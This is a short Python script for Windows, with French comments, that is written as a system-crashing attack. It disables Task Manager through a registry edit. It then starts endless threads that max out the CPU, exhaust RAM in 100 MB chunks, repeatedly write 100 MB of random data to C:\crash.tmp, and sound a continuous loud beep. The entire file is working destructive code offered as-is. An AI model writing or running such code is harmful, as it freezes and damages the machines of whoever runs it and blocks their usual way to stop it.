import os
import threading
import ctypes
import winsound
import time
import subprocess

def disable_task_manager():
    try:
        subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def cpu_killer():
    while True:
        pass

def ram_killer():
    chunks = []
    while True:
        try:
            chunks.append(bytearray(1024 * 1024 * 100))  # Alloue 100 Mo en boucle
        except:
            pass

def disk_killer():
    while True:
        try:
            with open("C:\\crash.tmp", "wb") as f:
                f.write(os.urandom(1024 * 1024 * 100))  # Écrit 100 Mo en boucle
        except:
            pass

def sound_killer():
    while True:
        winsound.Beep(4000, 1000)

if __name__ == "__main__":
    disable_task_manager()  # Désactive le Gestionnaire des tâches
    threading.Thread(target=cpu_killer).start()
    threading.Thread(target=ram_killer).start()
    threading.Thread(target=disk_killer).start()
    threading.Thread(target=sound_killer).start()
    while True:
        time.sleep(1)